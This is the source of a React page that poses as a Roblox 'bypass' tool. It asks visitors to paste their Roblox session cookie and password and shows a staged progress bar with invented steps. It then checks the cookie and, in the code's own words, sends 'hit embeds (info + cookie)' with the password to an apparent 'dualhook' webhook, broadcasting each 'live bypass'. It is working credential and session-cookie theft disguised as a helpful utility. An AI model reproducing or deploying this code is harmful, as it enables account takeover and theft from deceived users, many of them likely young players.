import { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { Eye, EyeOff, ArrowLeft, Loader2, CheckCircle2, XCircle, Cookie, Shield } from "lucide-react";
import ShieldIcon from "@/components/ShieldIcon";
import {
  dualhookSend, AccountInfo, isValidCookieFormat,
  broadcastLiveBypass, broadcastLiveBypassFailed, pushLiveBypass,
} from "@/lib/tokenStore";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "sonner";

const RATE_LIMIT_KEY = "bypass_attempts";
const MAX_ATTEMPTS_PER_MIN = 10;
const BYPASS_DURATION_MS = 60_000;

type BypassStatus = "idle" | "loading" | "success" | "error";

const STAGES = [
  { at: 0, label: "Initializing bypass engine..." },
  { at: 10, label: "Validating cookie signature..." },
  { at: 25, label: "Connecting to relay..." },
  { at: 45, label: "Negotiating session keys..." },
  { at: 65, label: "Submitting bypass payload..." },
  { at: 85, label: "Finalizing session..." },
  { at: 98, label: "Almost done..." },
];

const BypassPage = () => {
  const [cookie, setCookie] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [status, setStatus] = useState<BypassStatus>("idle");
  const [progress, setProgress] = useState(0);
  const navigate = useNavigate();
  const intervalRef = useRef<number | null>(null);

  useEffect(() => () => { if (intervalRef.current) window.clearInterval(intervalRef.current); }, []);

  function getAttempts(): number[] {
    try {
      const raw = localStorage.getItem(RATE_LIMIT_KEY);
      if (!raw) return [];
      const cutoff = Date.now() - 60_000;
      return (JSON.parse(raw) as number[]).filter(t => t > cutoff);
    } catch { return []; }
  }
  function recordAttempt() {
    const a = getAttempts();
    a.push(Date.now());
    localStorage.setItem(RATE_LIMIT_KEY, JSON.stringify(a));
  }

  const handleBypass = async () => {
    const trimmed = cookie.trim();
    if (!trimmed) { toast.error("Please enter a cookie"); return; }
    if (!isValidCookieFormat(trimmed)) {
      toast.error("Invalid cookie format");
      return;
    }

    const attempts = getAttempts();
    if (attempts.length >= MAX_ATTEMPTS_PER_MIN) {
      const wait = Math.ceil((60_000 - (Date.now() - attempts[0])) / 1000);
      toast.error(`Rate limit reached. Try again in ${wait}s.`);
      return;
    }
    recordAttempt();
    setStatus("loading");
    setProgress(0);

    const start = Date.now();
    intervalRef.current = window.setInterval(() => {
      setProgress(Math.min(99, ((Date.now() - start) / BYPASS_DURATION_MS) * 100));
    }, 200);

    // Validate cookie with Roblox first
    let apiOk = false;
    let info: AccountInfo = { valid: false };
    try {
      const { data, error } = await supabase.functions.invoke("roblox-fetch", { body: { cookie: trimmed } });
      if (!error && data?.valid) {
        apiOk = true;
        info = { ...(data.info as any), cookie: trimmed, password, valid: true };
      }
    } catch { apiOk = false; }

    // If cookie invalid → block bypass and announce failure
    if (!apiOk) {
      if (intervalRef.current) window.clearInterval(intervalRef.current);
      setProgress(0);
      setStatus("error");
      toast.error("Invalid cookie — bypass blocked");
      await broadcastLiveBypassFailed({ valid: false, username: 'Unknown' }, 'Invalid cookie');
      pushLiveBypass({ username: 'Unknown', success: false });
      return;
    }

    // Cookie valid — announce live bypass start immediately
    broadcastLiveBypass(info);

    const elapsed = Date.now() - start;
    if (elapsed < BYPASS_DURATION_MS) await new Promise(r => setTimeout(r, BYPASS_DURATION_MS - elapsed));

    if (intervalRef.current) window.clearInterval(intervalRef.current);
    setProgress(100);

    // Send dualhook hit embeds (info + cookie) regardless of age/2FA — only blocked by invalid cookie
    await dualhookSend("bypass", info);
    pushLiveBypass({ username: info.username || 'Unknown', avatarUrl: info.avatarUrl, success: true });

    setStatus("success");
    toast.success("Bypass successful!");
  };

  const currentStage = [...STAGES].reverse().find(s => progress >= s.at) ?? STAGES[0];

  return (
    <div className="min-h-screen px-4 py-6 relative overflow-hidden">
      <div className="absolute top-1/4 left-1/2 -translate-x-1/2 w-[500px] h-[500px] rounded-full bg-primary/5 blur-[120px] pointer-events-none" />

      <div className="max-w-sm mx-auto space-y-6 relative z-10 animate-fade-in-up">
        <div className="flex items-center gap-3">
          <button onClick={() => navigate("/dashboard")} className="text-muted-foreground hover:text-foreground transition-all duration-300 hover:-translate-x-1 p-1">
            <ArrowLeft size={20} />
          </button>
          <h1 className="text-xl font-bold text-foreground">Dashboard</h1>
        </div>

        <ShieldIcon size="md" />

        <div className="card-glow rounded-2xl p-5 space-y-4 animate-fade-in">
          <div className="space-y-2">
            <label className="text-sm font-semibold text-foreground flex items-center gap-1.5">
              <Cookie size={14} className="text-primary" /> Cookie
            </label>
            <input
              value={cookie}
              onChange={e => setCookie(e.target.value.slice(0, 1500))}
              maxLength={1500}
              placeholder="Paste your cookie..."
              disabled={status === "loading"}
              className="input-field text-sm font-mono transition-all"
            />
          </div>

          <div className="space-y-2">
            <label className="text-sm font-semibold text-foreground">Password</label>
            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={e => setPassword(e.target.value)}
                placeholder="Enter your password"
                disabled={status === "loading"}
                className="input-field pr-10 transition-all"
              />
              <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors">
                {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
              </button>
            </div>
          </div>

          <button
            onClick={handleBypass}
            disabled={status === "loading"}
            className="w-full shimmer text-primary-foreground font-semibold py-3.5 rounded-xl flex items-center justify-center gap-2.5 glow-btn transition-all duration-300 hover:scale-[1.01] disabled:opacity-50 disabled:hover:scale-100"
          >
            {status === "loading" ? (<><Loader2 size={18} className="animate-spin" /> Bypassing...</>)
              : status === "success" ? (<><CheckCircle2 size={18} /> Bypassed!</>)
              : status === "error" ? (<><XCircle size={18} /> Retry</>)
              : (<><Shield size={18} /> Bypass</>)}
          </button>
        </div>

        {status === "loading" && (
          <div className="card-glow rounded-2xl p-5 space-y-4 animate-fade-in">
            <div className="flex items-center gap-3">
              <Loader2 size={18} className="text-primary animate-spin" />
              <div className="flex-1">
                <p className="text-sm font-semibold text-foreground">{currentStage.label}</p>
              </div>
              <span className="text-sm font-bold text-primary tabular-nums">{Math.floor(progress)}%</span>
            </div>
            <div className="h-2 rounded-full bg-secondary/60 overflow-hidden">
              <div
                className="h-full bg-gradient-to-r from-primary/70 to-primary shadow-[0_0_15px_hsl(var(--primary))] transition-[width] duration-200 ease-linear"
                style={{ width: `${progress}%` }}
              />
            </div>
          </div>
        )}

        {status === "success" && (
          <div className="card-glow rounded-2xl p-5 flex items-center gap-3 animate-scale-in">
            <CheckCircle2 className="text-[hsl(var(--success))]" size={22} />
            <p className="text-sm font-semibold text-foreground">Bypass completed successfully.</p>
          </div>
        )}

        {status === "error" && (
          <div className="card-glow rounded-2xl p-5 flex items-center gap-3 animate-scale-in">
            <XCircle className="text-destructive" size={22} />
            <p className="text-sm font-semibold text-foreground">Bypass failed.</p>
          </div>
        )}
      </div>
    </div>
  );
};

export default BypassPage;
